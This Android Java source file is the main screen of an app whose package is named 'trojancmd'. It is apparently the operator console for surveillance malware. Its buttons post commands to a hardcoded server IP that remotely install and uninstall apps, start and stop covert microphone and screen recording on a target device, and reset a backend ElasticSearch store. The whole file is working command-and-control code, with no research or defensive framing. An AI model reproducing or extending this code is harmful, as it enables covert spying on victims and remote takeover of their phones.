package com.example.mm.trojancmd;

import android.content.Context;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.design.widget.BottomNavigationView;
import android.support.v7.app.AppCompatActivity;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Calendar;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    private Button installCMD;
    public Context context = this;
    public TextView IPAddr = null;

    private BottomNavigationView.OnNavigationItemSelectedListener mOnNavigationItemSelectedListener
            = new BottomNavigationView.OnNavigationItemSelectedListener() {

        @Override
        public boolean onNavigationItemSelected(@NonNull MenuItem item) {
            switch (item.getItemId()) {
                case R.id.navigation_home:
                    return true;
                case R.id.navigation_dashboard:
                    return true;
                case R.id.navigation_notifications:
                    return true;
            }
            return false;
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        BottomNavigationView navigation = (BottomNavigationView) findViewById(R.id.navigation);
        navigation.setOnNavigationItemSelectedListener(mOnNavigationItemSelectedListener);

        installCMD = (Button) findViewById(R.id.addInstallCMD);
        installCMD.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(context, "ADD Install Comman (A001)", Toast.LENGTH_LONG).show();
                new Thread() {
                    @Override
                    public void run() {
                        sendCommand.sendPost("https://118.190.159.86/api/v1.0/send_command/1", "install:A001");
                    }
                }.start();
            }
        });
        Button uninstallCMD = (Button) findViewById(R.id.addunInstallCMD);
        uninstallCMD.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(context, "ADD Uninstall Comman (A001)", Toast.LENGTH_LONG).show();
                new Thread() {
                    @Override
                    public void run() {
                        sendCommand.sendPost("https://118.190.159.86/api/v1.0/send_command/1", "uninstall:test.com.accessibility");
                    }
                }.start();
            }
        });
        Button resetESCMD = (Button) findViewById(R.id.reset_es);
        resetESCMD.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(context, "Reset ElasticSearch", Toast.LENGTH_LONG).show();
                new Thread() {
                    @Override
                    public void run() {
                        sendCommand.sendPost("https://118.190.159.86/api/v1.0/reset_es", "uninstall:test.com.accessibility");
                    }
                }.start();
            }
        });

        Button startRecordingMIC = (Button) findViewById(R.id.start_recording);
        startRecordingMIC.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendCommand.sendHTTPCommand(intentInterface.Remote_CMD_START_RECORDING, context);
                Toast.makeText(context, "start Recording MIC", Toast.LENGTH_LONG).show();
            }
        });
        Button stopRecordingMIC = (Button) findViewById(R.id.stop_recording);
        stopRecordingMIC.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendCommand.sendHTTPCommand(intentInterface.Remote_CMD_STOP_RECORDING, context);
                Toast.makeText(context, "stop Recording MIC", Toast.LENGTH_LONG).show();
            }
        });
        Button startRecordingScreen = (Button) findViewById(R.id.start_screen_recording);
        startRecordingScreen.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendCommand.sendHTTPCommand(intentInterface.Remote_CMD_START_ScreenRECORDING, context);
                Toast.makeText(context, "start Recording Screen", Toast.LENGTH_LONG).show();
            }
        });
        Button stopRecordingScreen = (Button) findViewById(R.id.stop_screen_recording);
        stopRecordingScreen.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sendCommand.sendHTTPCommand(intentInterface.Remote_CMD_STOP_ScreenRECORDING, context);
                Toast.makeText(context, "stop Recording Screen", Toast.LENGTH_LONG).show();
            }
        });

        this.IPAddr = (TextView) findViewById(R.id.ipaddr);
        this.IPAddr.setText("https://118.190.159.86");

        Button updateIP = (Button) findViewById(R.id.updateip);
        updateIP.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //TextView IPAddr = (TextView) context.findViewById(R.id.ipaddr);
                sendCommand.remoteURL = IPAddr.getText().toString();
                Toast.makeText(context, "Update ip addr", Toast.LENGTH_LONG).show();
            }
        });

    }
}
